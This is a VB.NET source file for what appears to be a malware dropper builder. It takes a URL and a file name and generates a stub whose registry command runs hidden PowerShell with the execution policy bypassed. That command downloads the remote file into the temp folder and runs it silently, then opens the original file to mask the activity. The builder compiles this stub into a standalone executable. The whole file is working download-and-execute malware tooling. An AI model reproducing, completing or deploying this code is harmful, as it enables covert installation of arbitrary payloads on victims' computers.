Imports System.IO
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Security.Principal

Public Class MainForm

    Private Sub LinkTextBox_TextChanged(sender As Object, e As EventArgs) Handles LinkTextBox.TextChanged, FileNameTextBox.TextChanged
        CreateButton.Enabled = (LinkTextBox.Text.Trim() <> "" AndAlso FileNameTextBox.Text.Trim() <> "")
    End Sub

    Private Function GenerateStub(url As String, fileName As String) As String
        Dim safeUrl As String = url.Replace("'", "''")
        Dim rawCommand As String = "cmd /c if /i not ""%~n1""==""powershell"" if /i not ""%~n1""==""cmd"" (start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$f = Join-Path $env:TEMP '" & fileName & "'; (New-Object Net.WebClient).DownloadFile('" & safeUrl & "', $f); Start-Process $f -WindowStyle Hidden"" & start """" ""%1"" %%) else (start """" ""%1"" %%)"
        Dim commandForRegistry As String = rawCommand.Replace("""", """""")
        Dim stubTemplate As String = My.Resources.Stub
        Return stubTemplate.Replace("{REGCMD}", commandForRegistry)
    End Function

    Private Function CompileToExe(srcFile As String, outExe As String, ByRef errorMsg As String) As Boolean
        Dim vbcPath As String = ""
        Dim paths() As String = {
            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe",
            "C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe"
        }
        For Each p In paths
            If File.Exists(p) Then
                vbcPath = p
                Exit For
            End If
        Next
        If vbcPath = "" Then
            errorMsg = "vbc.exe not found. Ensure .NET Framework 4.0+ is installed."
            Return False
        End If

        Dim args As String = "/target:winexe /out:""" & outExe & """ /reference:System.dll /reference:System.Windows.Forms.dll /reference:Microsoft.VisualBasic.dll /reference:System.Drawing.dll """ & srcFile & """"
        Dim proc As New Process()
        proc.StartInfo.FileName = vbcPath
        proc.StartInfo.Arguments = args
        proc.StartInfo.UseShellExecute = False
        proc.StartInfo.RedirectStandardOutput = True
        proc.StartInfo.RedirectStandardError = True
        proc.StartInfo.CreateNoWindow = True
        proc.Start()
        Dim output As String = proc.StandardOutput.ReadToEnd()
        Dim err As String = proc.StandardError.ReadToEnd()
        proc.WaitForExit()

        If proc.ExitCode = 0 Then
            Return True
        Else
            errorMsg = "Exit code: " & proc.ExitCode & vbCrLf & "Error: " & err & vbCrLf & "Output: " & output
            Return False
        End If
    End Function

    Private Sub LinkTextBox_TextChanged_1()

    End Sub

    Private Sub CreateButton_Click_1()
        Dim url As String = LinkTextBox.Text.Trim()
        Dim fileName As String = FileNameTextBox.Text.Trim()
        If url = "" Or fileName = "" Then Exit Sub
        fileName = Path.GetFileName(fileName)

        Dim sfd As New SaveFileDialog()
        sfd.Filter = "Executable|*.exe"
        sfd.Title = "Save Stub As"
        sfd.FileName = "Output"
        If sfd.ShowDialog() <> DialogResult.OK Then Exit Sub

        Dim outPath As String = sfd.FileName
        Dim tmpVb As String = Path.GetTempPath() & Guid.NewGuid().ToString() & ".vb"
        Dim stubSource As String = GenerateStub(url, fileName)
        File.WriteAllText(tmpVb, stubSource)

        Dim errorMsg As String = ""
        If CompileToExe(tmpVb, outPath, errorMsg) Then
            File.Delete(tmpVb)
            MsgBox("Stub created: " & outPath, MsgBoxStyle.Information, "Done")
        Else
            MsgBox("Compilation failed:" & vbCrLf & errorMsg, MsgBoxStyle.Critical, "Error")
        End If
    End Sub
End Class